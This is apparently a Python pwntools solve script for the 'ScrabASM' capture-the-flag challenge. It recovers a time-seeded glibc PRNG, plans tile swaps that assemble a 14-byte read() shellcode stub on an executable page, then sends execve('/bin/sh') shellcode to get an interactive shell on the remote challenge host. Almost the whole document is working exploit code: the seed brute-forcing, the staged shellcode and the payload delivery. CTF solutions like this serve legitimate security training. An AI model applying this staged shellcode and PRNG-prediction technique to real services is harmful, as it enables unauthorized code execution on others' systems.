#!/usr/bin/env python3
"""
ScrabASM CTF Exploit
====================
Vulnerability: 14 user-controlled bytes are copied to a fixed RWX page
(0x13370000) and executed as code. The PRNG is seeded with time(NULL),
so we can predict rand() values and craft exact byte sequences via
strategic tile swaps.

Stage 1 (14 bytes) – read() stub loaded via tile swaps:
    xor eax, eax          ; rax = 0  (SYS_read)
    xor edi, edi          ; rdi = 0  (stdin)
    cdq                   ; rdx = 0  (sign-extend eax)
    mov esi, 0x1337000e   ; rsi = board + 14
    mov dl,  0xff         ; rdx = 255
    syscall               ; read(0, board+14, 255)

After syscall returns, execution falls through to byte 14 where
Stage 2 (execve /bin/sh) has been read in.

Usage:
    python3 solve.py                  # local
    python3 solve.py HOST:PORT        # remote
"""

from pwn import *
from ctypes import CDLL, c_uint
import time, re, sys

# ── Context ──────────────────────────────────────────────────────────
context.arch = "amd64"
context.os   = "linux"

HAND_SIZE  = 14
BOARD_ADDR = 0x13370000

# ── Shellcode ────────────────────────────────────────────────────────
# Stage 1: 14-byte read() stub  (fits exactly in HAND_SIZE)
STAGE1 = asm(
    f"""
    xor eax, eax
    xor edi, edi
    cdq
    mov esi, {BOARD_ADDR + HAND_SIZE}
    mov dl,  0xff
    syscall
    """
)
assert len(STAGE1) == HAND_SIZE, f"Stage1 size mismatch: {len(STAGE1)}"

# Stage 2: execve("/bin/sh", NULL, NULL)
STAGE2 = asm(shellcraft.sh())

log.info(f"Stage 1 ({len(STAGE1)}B): {STAGE1.hex()}")
log.info(f"Stage 2 ({len(STAGE2)}B): {STAGE2.hex()}")

# ── PRNG helpers (glibc rand) ────────────────────────────────────────
libc = CDLL("libc.so.6")


def predict_rands(seed, count):
    """Return `count` low-byte rand() values for the given seed."""
    libc.srand(c_uint(seed))
    return [libc.rand() & 0xFF for _ in range(count)]


def find_seed(initial_hand, time_hint, search_range=30):
    """Brute-force the srand(time(NULL)) seed by matching the initial hand."""
    for offset in range(-search_range, search_range + 1):
        seed = time_hint + offset
        vals = predict_rands(seed, HAND_SIZE)
        if vals == initial_hand:
            log.success(f"Recovered seed: {seed}  (offset {offset:+d}s)")
            return seed
    return None


# ── Swap planner ─────────────────────────────────────────────────────
def plan_swaps(seed):
    """
    Given the PRNG seed, figure out the minimal-ish sequence of
    swap operations that transforms the initial hand into STAGE1.

    Each swap consumes the *next* rand() value from the global state
    and assigns it to the tile index we choose.  Strategy:
      • If the next rand value matches a tile we still need → assign there.
      • Otherwise → dump it on a tile that is already wrong.
    Never touch a tile that is already correct.
    """
    target = list(STAGE1)
    rands  = predict_rands(seed, 200_000)

    hand     = list(rands[:HAND_SIZE])
    rand_idx = HAND_SIZE
    swaps    = []

    for _ in range(150_000):
        wrong = [i for i in range(HAND_SIZE) if hand[i] != target[i]]
        if not wrong:
            log.success(f"Swap plan ready: {len(swaps)} swaps")
            return swaps

        nv = rands[rand_idx]
        rand_idx += 1

        # Can this value fix any wrong tile?
        placed = False
        for i in wrong:
            if target[i] == nv:
                hand[i] = nv
                swaps.append(i)
                placed = True
                break

        if not placed:
            # Waste it on the first wrong tile (keeps correct tiles safe)
            hand[wrong[0]] = nv
            swaps.append(wrong[0])

    log.error("Swap planning exceeded iteration limit")
    return None


# ── Output parser ────────────────────────────────────────────────────
def parse_hand(data):
    """Extract the 14 hex-byte tile values from the program banner."""
    matches = re.findall(r"\|\s([0-9a-fA-F]{2})\s", data)
    if len(matches) >= HAND_SIZE:
        return [int(x, 16) for x in matches[:HAND_SIZE]]
    return None


# ── Main exploit ─────────────────────────────────────────────────────
def exploit(target=None):
    if target:
        host, port = target.split(":")
        p = remote(host, int(port))
    else:
        p = process("./chall")

    t_connect = int(time.time())

    # ── 1. Read banner & parse initial hand ──────────────────────────
    data = p.recvuntil(b"> ").decode()
    initial_hand = parse_hand(data)
    if initial_hand is None:
        log.error("Could not parse initial hand!")
        p.close()
        return

    log.info(f"Parsed hand : {[hex(b) for b in initial_hand]}")
    log.info(f"Target hand : {[hex(b) for b in STAGE1]}")

    # ── 2. Recover PRNG seed ─────────────────────────────────────────
    seed = find_seed(initial_hand, t_connect, search_range=60)
    if seed is None:
        log.error("Seed not found – try widening search range")
        p.close()
        return

    # ── 3. Plan tile swaps ───────────────────────────────────────────
    swaps = plan_swaps(seed)
    if swaps is None:
        p.close()
        return

    # ── 4. Execute swaps (blast all input at once for speed) ────────
    total = len(swaps)
    log.info(f"Blasting {total} swaps + play command …")

    # Build the entire interaction payload at once:
    #   For each swap: "1\n" then "<index>\n"
    #   Then "2\n" to play
    payload = b""
    for idx in swaps:
        payload += b"1\n" + str(idx).encode() + b"\n"
    payload += b"2\n"
    p.send(payload)

    # ── 5. Wait for "Playing your word" to confirm stage 1 ran ──────
    log.info("Waiting for board execution …")
    p.recvuntil(b"TRIPLE WORD SCORE!", timeout=30)

    # ── 6. Deliver stage 2 via the read() syscall ────────────────────
    sleep(0.5)
    log.info(f"Sending stage 2 ({len(STAGE2)}B) …")
    p.send(STAGE2)

    # ── 7. Shell ─────────────────────────────────────────────────────
    log.success("Exploit complete – enjoy your shell!")
    p.interactive()


if __name__ == "__main__":
    if len(sys.argv) > 1:
        exploit(sys.argv[1])
    else:
        exploit("chall.lac.tf:31338")
